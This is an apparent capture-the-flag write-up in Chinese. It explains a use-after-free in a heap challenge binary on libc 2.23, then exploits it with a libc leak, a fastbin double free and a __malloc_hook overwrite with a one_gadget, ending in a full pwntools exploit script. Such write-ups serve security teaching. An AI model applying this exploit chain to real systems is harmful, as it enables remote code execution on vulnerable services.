# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: on
  - NX: on
  - RELRO: Full RELRO
  - Canary: on

# 漏洞成因
## 程序关键结构体
程序使用一个结构体来管理“女友”信息。从反编译代码 `sub_B49` 函数中可以看出，该结构体的大小为 `0x18` 字节，其布局如下：
```c
struct Girl {
    char *name_ptr;     // 指向存储姓名的堆块指针
    int size;           // 姓名堆块的大小
    char phone[12];     // 电话号码，固定12字节
    // 可能还有一个填充/结束字节，使得结构体对齐到0x18
};
```
一个全局数组 `girls_array` (位于 `.bss` 段的 `unk_202060`) 用于存储这些结构体的指针。

## 漏洞定位
漏洞位于 `call_girlfriend` 函数（反编译代码中的 `sub_DD6`）中。该函数在释放存储姓名的堆块（`free(girl->name_ptr)`）后，**没有将结构体中的 `name_ptr` 指针置空**，导致存在 Use-After-Free (UAF) 漏洞。
```c
if ( *((_QWORD *)&unk_202060 + v2) )      // 检查结构体指针是否存在
    free(**((void ***)&unk_202060 + v2)); // UAF: 仅释放了 name_ptr，未置空
```
攻击者可以通过 `show` 功能（`sub_CFC`）读取已被释放的 `name_ptr` 指向的堆块内容，或通过 `edit` 功能（虽然题目中该功能未实现，但通过堆布局可间接写入）写入数据，从而实现信息泄漏和堆内存操控。

# 漏洞利用过程：
利用 UAF 漏洞泄漏 libc 基址，然后通过 Fastbin Double Free 攻击劫持 `__malloc_hook`，最终通过触发 `malloc` 执行 `one_gadget` 获取 shell。
- Step 1-3: 堆布局并利用 UAF 泄漏 libc 基地址。
- Step 4: 构造 Fastbin Double Free，为攻击 `__malloc_hook` 做准备。
- Step 5-6: 进行 Fastbin Attack，将 `__malloc_hook` 附近的内存区域链入 fastbin，并写入 `one_gadget` 和 `realloc` 调整栈帧的地址。
- Step 7: 触发 `malloc` 调用，从而执行 `one_gadget` 获得 shell。

## Step 1-3
- **Step 1**: 程序先后分配了三个 `Girl` 结构体及其 `name` 堆块。`girl[0]` 的 `name` 大小为 `0x80`（落入 unsorted bin），`girl[1]` 和 `girl[2]` 的 `name` 大小为 `0x60`（落入 fastbin）。
- **Step 2**: 调用 `call(0)`，释放了 `girl[0]` 的 `name` 堆块（`0x80`）。由于该大小不属于 fastbin，它被放入 unsorted bin。在 main arena 中，该空闲块的 `fd` 和 `bk` 指针指向了 main_arena 内部的地址（例如 `main_arena+88`）。
- **Step 3**: 调用 `show(0)`。由于 `girl[0]->name_ptr` 未被清空，程序读取了已释放的 `0x80` 堆块的内容，其中包含了 main_arena 的地址。计算 `libc_base = leak_addr - 0x3c4b78`（对于 libc 2.23，`main_arena+88` 的偏移是 `0x3c4b78`）。

## Step 4
- 调用 `call(1); call(2); call(1)`。这依次释放了 `girl[1]` (`0x60`), `girl[2]` (`0x60`), 再次释放 `girl[1]` (`0x60`)。
- 在 fastbin 中，形成了一个 `0x60` 大小块的循环链表：`girl[1] -> girl[2] -> girl[1]`。这为后续的任意地址写（Fastbin Attack）创造了条件。

## Step 5-6
- **Step 5**: `add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))`。这次分配会从 fastbin 链表头（即 `girl[1]`）取出一个块。我们将伪造的 `fd` 指针（指向 `__malloc_hook` 上方 `0x23` 处）写入这个块。此时 fastbin 链表变为：`girl[2] -> fake_chunk(__malloc_hook-0x23)`。
- 随后的两次 `add(0x60)` 会依次取出 `girl[2]` 和 `fake_chunk`。至此，我们获得了一个位于 `__malloc_hook` 附近的 chunk。
- **Step 6**: 在 `fake_chunk` 对应的 `name` 区域写入 payload。由于 `__malloc_hook` 位于 `fake_chunk+0x23` 处，所以先用 `b'a'*11` 填充偏移，然后将 `__malloc_hook` 覆盖为 `one_gadget`，并在 `__realloc_hook`（紧邻 `__malloc_hook`）写入 `realloc+2` 用于调整栈帧以满足 `one_gadget` 的约束条件。

## Step 7
- 执行 `p.sendlineafter("Input your choice:", "1")` 选择添加功能。这会触发 `malloc` 来分配新的 `Girl` 结构体（`malloc(0x18)`），从而调用已被劫持的 `__malloc_hook`，最终执行 `one_gadget` 获取 shell。

# Exploit：
```python
from pwn import *
from pwncli import * # 使用了pwncli库简化设置

cli_script()

p = gift['io']
elf = gift['elf']

# 根据调试环境选择不同的 one_gadget 偏移
if gift['debug']:
    gadget = 0xf1207
    libc = gift['libc']
else:
    gadget = 0xf1147
    libc = ELF("./libc-2.23.so")

def add(size, name="a", phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name) # 注意 typo "inpute"
    p.sendafter("please input her call:\n", phone)

def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline()
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone

def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx))

# Step 1: 堆布局，创建用于泄漏和攻击的堆块
add(0x80) # idx0, 用于泄漏 libc
add(0x60) # idx1, 用于 Fastbin Double Free
add(0x60) # idx2, 用于 Fastbin Double Free

# Step 2 & 3: 利用 UAF 泄漏 libc 地址
call(0)                     # 释放 idx0 的 name，使其进入 unsorted bin
name, _ = show(0)           # UAF 读取 idx0 的 name，泄漏 main_arena 地址
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
log_address("leak_libc_addr", leak_libc_addr)
# libc 2.23 中，main_arena+88 的偏移是 0x3c4b78
libc_base_addr = leak_libc_addr - 0x3c4b78
log_address("libc_base_addr", libc_base_addr)
libc.address = libc_base_addr # 设置 libc 基址以便后续计算符号地址

# Step 4: 构造 Fastbin Double Free (0x60 大小)
call(1) # 释放 idx1 -> fastbin: idx1
call(2) # 释放 idx2 -> fastbin: idx2 -> idx1
call(1) # 再次释放 idx1 -> fastbin: idx1 -> idx2 -> idx1 (循环链表)

# Step 5: Fastbin Attack，劫持 __malloc_hook
# 第一次分配，修改 idx1 的 fd 指针指向伪造的 chunk (__malloc_hook - 0x23)
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))
add(0x60) # 分配 idx2，清空链表中的一个节点
add(0x60) # 分配 fake_chunk (位于 __malloc_hook 附近)

# Step 6: 在 fake_chunk 处写入 payload，覆盖 __malloc_hook 和 __realloc_hook
# __malloc_hook 位于 fake_chunk+0x23 处，前面需要 11 字节填充
# 使用 realloc+2 调整栈帧以提高 one_gadget 成功率
payload = flat([b'a' * 11, libc.address + gadget, libc.sym['realloc'] + 2])
add(0x60, payload) # 这个 add 会修改 fake_chunk 的内容

# Step 7: 触发 malloc，执行 one_gadget
p.sendlineafter("Input your choice:", "1") # 选择添加功能，会调用 malloc(0x18)

p.interactive()
```